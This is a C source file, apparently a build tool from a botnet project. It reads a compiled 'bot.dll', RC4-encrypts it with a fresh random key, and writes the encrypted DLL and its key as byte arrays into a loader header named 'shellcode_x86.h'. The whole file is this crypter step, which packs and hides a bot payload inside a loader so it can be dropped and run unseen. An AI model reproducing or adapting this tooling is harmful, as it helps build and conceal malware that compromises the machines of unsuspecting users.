#include <Winsock2.h>
#include <Windows.h>

#include "..\common\api.h"
#include "..\common\mem.h"
#include "..\common\string.h"
#include "..\common\utils.h"
#include "..\common\crypto.h"

bot_t bot;

static LPSTR _BuildShellcodeFromBuffer(const LPVOID lpBuffer, DWORD dwBufferSize, DWORD* pdwSize, const LPSTR ArrayName)
{
	LPSTR pszBuffer;
	BYTE* pBuffer;
	char szBuffer[4];
	DWORD i, dwLength, dwBuffLen;

	if((pBuffer = (BYTE*)lpBuffer) == NULL)
		return NULL;

	pszBuffer = NULL;

	StrConcatA(&pszBuffer, "unsigned char ");
	StrConcatA(&pszBuffer, ArrayName);
	StrConcatA(&pszBuffer, "[] = {");


	dwLength = StrLengthA(pszBuffer);

	for(i = 0; i < dwBufferSize; i++)
	{
		memzero(&szBuffer, sizeof(szBuffer));
		dwBuffLen = CWA(wsprintfA)(szBuffer, "0x%02x", pBuffer[i]);
		//pszBuffer = StrConcatA(pszBuffer, szBuffer);

		StrConcatExA(&pszBuffer, dwLength, szBuffer, dwBuffLen);
		dwLength += dwBuffLen;

		if(i != dwBufferSize - 1)
		{
			StrConcatExA(&pszBuffer, dwLength, ",", 1);
			dwLength += 1;
		}
	}

	StrConcatExA(&pszBuffer, dwLength, "};", 2);
	dwLength += 1;

	*pdwSize = dwLength;

	return pszBuffer;
}

int main(int argc, char **argv)
{
	LPWSTR pwzInputFile, pwzOutputFile;
	LPVOID lpInputFile;
	DWORD dwInputFileSize, dwShellcodeSize, dwKeyShellcodeSize;
	LPSTR pszShellcode;
	LPSTR pszKeyShellcode;
	LPBYTE RC4Key = NULL;

	if(!InitializeAPI())
		return 0;

	pwzInputFile = L"E:\\backup\\v\\bot\\Release\\bot.dll";
	pwzOutputFile = L"E:\\backup\\v\\loader\\shellcode_x86.h";
	//

	//pwzInputFile = ansiToUnicodeEx(argv[1], StrLengthA(argv[1]));
	//pwzOutputFile = ansiToUnicodeEx(argv[2], StrLengthA(argv[2]));

	//MessageBoxW(0, pwzInputFile, 0, 0);
	//MessageBoxW(0, pwzOutputFile, 0, 0);

	if((lpInputFile = ReadFileFromDisk(pwzInputFile, &dwInputFileSize)) == NULL)
		return 0;

	RC4Key = _RC4GenKey(256);
	_RC4(RC4Key, dwInputFileSize, lpInputFile, 256);

	
	if((pszShellcode = _BuildShellcodeFromBuffer(lpInputFile, dwInputFileSize, &dwShellcodeSize, "bot_shellcode_x86")) == NULL)
		return 0;

	if((pszKeyShellcode = _BuildShellcodeFromBuffer(RC4Key, 256, &dwKeyShellcodeSize, "key_shellcode_x86")) == NULL)
		return 0;

	if(StrConcatA(&pszShellcode, "\r\n") && StrConcatA(&pszShellcode, pszKeyShellcode))
	{
		WriteFileToDisk(pszShellcode, StrLengthA(pszShellcode), pwzOutputFile);
	}

	//StrConcatW(pwzOutputFile, L"_key.h");

	//WriteFileToDisk(pszKeyShellcode, dwKeyShellcodeSize, pwzOutputFile);

	return 0;
}